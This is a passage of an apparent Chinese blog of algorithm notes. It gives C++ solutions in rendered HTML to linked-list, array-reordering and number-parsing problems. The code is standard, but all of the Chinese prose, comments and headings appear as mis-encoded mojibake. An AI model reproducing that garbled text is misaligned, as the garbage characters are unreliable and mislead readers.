class="literal">false</span>;</span><br><span class="line">    s = s.<span class="built_in">substr</span>(i, j - i + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.å»é™¤å¼€å¤´çš„ + å’Œ - (å»é™¤ååœ¨å¾ªç¯ä¸­åªç”¨åˆ¤æ–­æ•°å­—ã€ç‚¹ã€e/E 3ç§æƒ…å†µ)</span></span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">&#x27;+&#x27;</span> || s[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) s = s.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">size</span>() == <span class="number">1</span> &amp;&amp; s[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> dot = <span class="number">0</span>, e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;  <span class="comment">// å­—ç¬¦, è€Œéæ•°å­—</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        dot++;</span><br><span class="line">        <span class="keyword">if</span> (dot &gt; <span class="number">1</span> || e) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;e&#x27;</span> || s[i] == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">        e++;</span><br><span class="line">        <span class="keyword">if</span> (!i || i == s.<span class="built_in">size</span>() - <span class="number">1</span> || (i == <span class="number">1</span> &amp;&amp; s[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) || e &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; s.<span class="built_in">size</span>() &amp;&amp; (s[i + <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span> || s[i + <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (i + <span class="number">1</span> == s.<span class="built_in">size</span>() - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          i++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;  <span class="comment">// ä¸­é—´è‹¥åŒ…å«å…¶ä»–å­—ç¬¦ï¼Œåˆ™ret false(&#x27;e&#x27;åæ¥&#x27;+/-&#x27;çš„æƒ…å†µåœ¨&#x27;e&#x27;ä¸­å¤„ç†)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢"><a href="https://www.acwing.com/problem/content/30/">è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢</a></h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œå®ç°ä¸€ä¸ªå‡½æ•°æ¥è°ƒæ•´è¯¥æ•°ç»„ä¸­æ•°å­—çš„é¡ºåºã€‚</p><p>ä½¿å¾—æ‰€æœ‰çš„å¥‡æ•°ä½äºæ•°ç»„çš„å‰åŠéƒ¨åˆ†ï¼Œæ‰€æœ‰çš„å¶æ•°ä½äºæ•°ç»„çš„ååŠéƒ¨åˆ†ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3,4,5]è¾“å‡º: [1,3,5,2,4]</code></pre><h3 id="å¾ªç¯éå†-O-n">å¾ªç¯éå† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">reOrderArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;array)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = array.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r &amp;&amp; array[l] % <span class="number">2</span> == <span class="number">1</span>) l++;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r &amp;&amp; array[r] % <span class="number">2</span> == <span class="number">0</span>) r--;</span><br><span class="line">      <span class="built_in">swap</span>(array[l], array[r]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹"><a href="https://www.acwing.com/problem/content/32/">é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹</a></h2><p>è¾“å…¥ä¸€ä¸ªé“¾è¡¨ï¼Œè¾“å‡ºè¯¥é“¾è¡¨ä¸­å€’æ•°ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªç»“ç‚¹ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li><code>k &gt;= 1</code>;</li><li>å¦‚æœ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å¤§äºé“¾è¡¨é•¿åº¦ï¼Œåˆ™è¿”å› NULL;</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,30]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šé“¾è¡¨ï¼š1-&gt;2-&gt;3-&gt;4-&gt;5 ï¼Œk=2è¾“å‡ºï¼š4</code></pre><h3 id="æ³•1-1-pass-with-å¿«æ…¢æŒ‡é’ˆ-O-n">æ³•1 1-pass with å¿«æ…¢æŒ‡é’ˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">findKthToTail</span><span class="params">(ListNode* pListHead, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode *fast = pListHead, *slow = pListHead;</span><br><span class="line">    <span class="keyword">while</span> (k--) &#123;</span><br><span class="line">      <span class="keyword">if</span> (fast) &#123;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (fast) &#123;</span><br><span class="line">      fast = fast-&gt;next;</span><br><span class="line">      slow = slow-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-2-pass-O-n">æ³•2 2-pass <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">findKthToTail</span><span class="params">(ListNode* pListHead, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p = pListHead; p; p = p-&gt;next) s++;</span><br><span class="line">    <span class="keyword">if</span> (s &lt; k) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> p = pListHead;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s - k; i++) p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹â˜…"><a href="https://www.acwing.com/problem/content/86/">é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹â˜…</a></h2><p>ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œè‹¥å…¶ä¸­åŒ…å«ç¯ï¼Œåˆ™è¾“å‡ºç¯çš„å…¥å£èŠ‚ç‚¹ã€‚</p><p>è‹¥å…¶ä¸­ä¸åŒ…å«ç¯ï¼Œåˆ™è¾“å‡º<code>null</code>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>èŠ‚ç‚¹ val å€¼å–å€¼èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚<br>èŠ‚ç‚¹ val å€¼å„ä¸ç›¸åŒã€‚<br>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221216152840724.png" alt></p><pre><code>ç»™å®šå¦‚ä¸Šæ‰€ç¤ºçš„é“¾è¡¨ï¼š[1, 2, 3, 4, 5, 6]2æ³¨æ„ï¼Œè¿™é‡Œçš„2è¡¨ç¤ºç¼–å·æ˜¯2çš„èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹ç¼–å·ä»0å¼€å§‹ã€‚æ‰€ä»¥ç¼–å·æ˜¯2çš„èŠ‚ç‚¹å°±æ˜¯valç­‰äº3çš„èŠ‚ç‚¹ã€‚åˆ™è¾“å‡ºç¯çš„å…¥å£èŠ‚ç‚¹3.</code></pre><h3 id="æ³•1-å°å­¦å¥¥æ•°-å¿«æ…¢æŒ‡é’ˆæ‰«æ-O-n">æ³•1 å°å­¦å¥¥æ•° + å¿«æ…¢æŒ‡é’ˆæ‰«æ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>è§£æè¯·çœ‹<a href="https://www.acwing.com/video/158/">yæ€»è§†é¢‘</a><br>çœ‹æ‡‚åä»¥åé‡åˆ°æ­¤é¢˜åœ¨è‰ç¨¿çº¸ä¸Šè‡ªå·±åº”è¯¥èƒ½æ¨å¯¼å‡ºæ¥</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">entryNodeOfLoop</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// é˜²æ­¢åªæœ‰1ä¸ªå…ƒç´ çš„æ— ç¯æƒ…å†µ: ç›¸é‡åè®¿é—®nextè¯­å¥ä¼šå¯¼è‡´segment fault</span></span><br><span class="line">    <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    </span><br><span class="line">    ListNode *fast = head, *slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast &amp;&amp; slow) &#123;</span><br><span class="line">      fast = fast-&gt;next;</span><br><span class="line">      slow = slow-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (fast) fast = fast-&gt;next;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">        slow = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow) &#123;</span><br><span class="line">          fast = fast-&gt;next;</span><br><span class="line">          slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-ä½¿ç”¨å“ˆå¸Œè¡¨æˆ–è€…set">æ³•2 ä½¿ç”¨å“ˆå¸Œè¡¨æˆ–è€…set</h3><p>ä¸â€œå¿«æ…¢æŒ‡é’ˆæ‰«ææ³•â€ç›¸æ¯”ï¼Œç©ºé—´å¤æ‚åº¦ä¼šé«˜ä¸€äº›</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">entryNodeOfLoop</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    unordered_set&lt;ListNode*&gt; us;</span><br><span class="line">    <span class="keyword">auto</span> p = head;</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!us.<span class="built_in">count</span>(p)) &#123;</span><br><span class="line">        us.<span class="built_in">insert</span>(p);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-3">Week 3</h1><h2 id="åè½¬é“¾è¡¨â˜…"><a href="https://www.acwing.com/problem/content/33/">åè½¬é“¾è¡¨â˜…</a></h2><p>å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ä¸€ä¸ªé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼Œåè½¬è¯¥é“¾è¡¨å¹¶è¾“å‡ºåè½¬åé“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚</p><p><strong>æ€è€ƒé¢˜ï¼š</strong></p><ul><li>è¯·åŒæ—¶å®ç°è¿­ä»£ç‰ˆæœ¬å’Œé€’å½’ç‰ˆæœ¬ã€‚</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,30]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULLè¾“å‡º:5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</code></pre><h3 id="æ³•1-è¿­ä»£æ³•">æ³•1 è¿­ä»£æ³•</h3><p>ç¿»è½¬å³å°†æ‰€æœ‰èŠ‚ç‚¹çš„nextæŒ‡é’ˆæŒ‡å‘å‰é©±èŠ‚ç‚¹ã€‚<br>ç”±äºæ˜¯å•é“¾è¡¨ï¼Œæˆ‘ä»¬åœ¨è¿­ä»£æ—¶ä¸èƒ½ç›´æ¥æ‰¾åˆ°å‰é©±èŠ‚ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé¢å¤–çš„æŒ‡é’ˆä¿å­˜å‰é©±èŠ‚ç‚¹ã€‚åŒæ—¶åœ¨æ”¹å˜å½“å‰èŠ‚ç‚¹çš„nextæŒ‡é’ˆå‰ï¼Œä¸è¦å¿˜è®°ä¿å­˜å®ƒçš„åç»§èŠ‚ç‚¹ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode *cur = head, *prev = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      ListNode *next = cur-&gt;next;</span><br><span class="line">      cur-&gt;next = prev;</span><br><span class="line">      prev = cur, cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-é€’å½’æ³•">æ³•2 é€’å½’æ³•</h3><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221216181625909.png" alt="image-20221216181625909"></p><p>é¦–å…ˆæˆ‘ä»¬å…ˆè€ƒè™‘ <code>reverseList()</code> å‡½æ•°èƒ½åšä»€ä¹ˆï¼Œå®ƒå¯ä»¥ç¿»è½¬ä¸€ä¸ªé“¾è¡¨ï¼Œå¹¶è¿”å›æ–°é“¾è¡¨çš„å¤´èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯åŸé“¾è¡¨çš„å°¾èŠ‚ç‚¹ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé€’å½’å¤„ç† <code>reverseList(head-&gt;next)</code>ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å°†ä»¥``head-&gt;next`ä¸ºå¤´èŠ‚ç‚¹çš„é“¾è¡¨ç¿»è½¬ï¼Œæ­¤æ—¶head-&gt;nextæ˜¯æ–°é“¾è¡¨çš„å°¾èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ä»¤å®ƒçš„nextæŒ‡é’ˆæŒ‡å‘headï¼Œå¹¶å°†head-&gt;nextæŒ‡å‘ç©ºå³å¯å°†æ•´ä¸ªé“¾è¡¨ç¿»è½¬ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode *new_head = <span class="built_in">reverseList</span>(head-&gt;next);</span><br><span class="line">    head-&gt;next-&gt;next = head;</span><br><span class="line">    head-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> new_head;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨"><a 